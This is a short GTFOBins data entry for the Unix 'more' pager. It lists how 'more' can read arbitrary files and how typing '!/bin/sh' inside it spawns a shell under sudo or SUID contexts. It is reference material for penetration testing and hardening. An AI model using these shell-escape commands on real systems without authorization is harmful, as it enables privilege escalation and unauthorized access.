<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/more -->
---
functions:
  file-read:
  - code: |-
      more /path/to/input-file
    comment: |-
      The file is displayed in the terminal interface.
    contexts:
      sudo:
      suid:
      unprivileged:
  shell:
  - code: |-
      more /etc/hosts
      !/bin/sh
    contexts:
      sudo:
      suid:
        shell: true
      unprivileged:
...
